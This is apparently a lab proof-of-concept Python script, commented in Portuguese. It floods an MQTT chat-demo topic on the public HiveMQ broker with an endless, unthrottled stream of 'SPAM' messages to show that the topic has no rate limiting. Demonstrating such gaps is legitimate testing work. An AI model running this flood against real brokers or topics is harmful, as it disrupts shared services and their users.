# --- CONCEITO DE CÓDIGO PARA TESTE DE LABORATÓRIO ---
# Este script não é para uso malicioso.
# Ele demonstra a falta de "rate limiting".

import paho.mqtt.client as mqtt
import time

TARGET_TOPIC = "inteli/mqtt_chat_demo/sender" 
BROKER = "broker.hivemq.com"
PORT = 1883

client = mqtt.Client(client_id="flood-test-001", protocol=mqtt.MQTTv5)
client.connect(BROKER, PORT, 60)
client.loop_start() # Inicia a rede

print(f"Iniciando envio rápido de mensagens para: {TARGET_TOPIC}")
print("Pressione CTRL+C para parar.")

try:
    i = 0
    while True:
        # Publica mensagens em um loop muito rápido
        msg = f"SPAM {i}"
        client.publish(TARGET_TOPIC, msg)
        i += 1
        
except KeyboardInterrupt:
    print("\nParando o teste.")
finally:
    client.loop_stop()
    client.disconnect()